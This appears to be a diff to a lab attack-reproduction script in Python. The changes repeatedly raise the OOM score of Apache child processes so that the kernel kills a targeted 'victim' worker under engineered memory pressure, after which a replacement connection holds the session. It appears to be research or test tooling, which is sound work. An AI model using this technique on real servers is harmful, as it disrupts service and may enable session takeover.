@@ -33,9 +33,32 @@ import lab
 
 X_EST = 40_000_000            # conservative estimate of victim transient charge
 CALIB_HEADROOM = 80_000_000   # first attempt: huge slack, sample the trace
-MAX_ATTEMPTS = 32   # runner hardware is slower/noisier than a dev machine;
-                    # the damped feedback typically lands in <20 attempts
+MAX_ATTEMPTS = 40   # runner hardware is slower/noisier than a dev machine;
+                    # worker recycling adds noise to the feedback
 K_TARGET = lab.k_target()     # refreshed by main() after set_geometry
+
+
+# ------------------------------------------------------------- oom victim
+
+def boost_children() -> int:
+    """Raise oom_score_adj to +500 on every apache child.
+
+    The OOM must select a child (ideally the victim, the largest RSS) and
+    never pid 1 / the master - a master death takes the whole container
+    down. Must be re-run before the victim connection: workers recycle
+    (MaxConnectionsPerChild) and children forked after the first boost
+    would serve the victim unboosted.
+    """
+    n = 0
+    for p in lab.sh(
+        "for p in $(pgrep apache2); do "
+        "[ \"$p\" != \"1\" ] && echo $p; done").split():
+        try:
+            if lab.set_oom_adj(int(p), 500):
+                n += 1
+        except ValueError:
+            pass
+    return n
 
 
 # --------------------------------------------------------------- evictor
@@ -142,19 +165,10 @@ def attempt(headroom: int, port: int, container: str) -> dict:
 
     # make every existing apache *child* a valid OOM candidate with +500,
     # so the victim (largest RSS among them) wins; pid 1 (the master) must
-    # never be selected or the container dies. No new child spawns because
-    # MinSpare keeps idles available for the replacement connection.
-    pids = lab.sh(
-        "for p in $(pgrep apache2); do "
-        "[ \"$p\" != \"1\" ] && echo $p; done").split()
-    adj_ok = 0
-    for p in pids:
-        try:
-            if lab.set_oom_adj(int(p), 500):
-                adj_ok += 1
-        except ValueError:
-            pass
-    res["adj_children"] = adj_ok
+    # never be selected or the container dies. Re-run again right before
+    # the victim connection: with worker recycling (MaxConnectionsPerChild)
+    # children forked after this boost would serve the victim unboosted.
+    res["adj_children"] = boost_children()
 
     b0 = lab.mem_current()
     limit = b0 + headroom
@@ -183,6 +197,9 @@ def attempt(headroom: int, port: int, container: str) -> dict:
 
     repl_sock = None
     try:
+        # workers may have recycled since the first boost - make sure the
+        # children about to serve the victim are OOM candidates too
+        res["adj_children"] = boost_children()
         repl_sock, _ = lab.replacement_hold(sid)
         # wait for the victim to die (RST/EOF) or time out (no OOM)
         repl_sock.settimeout(6)
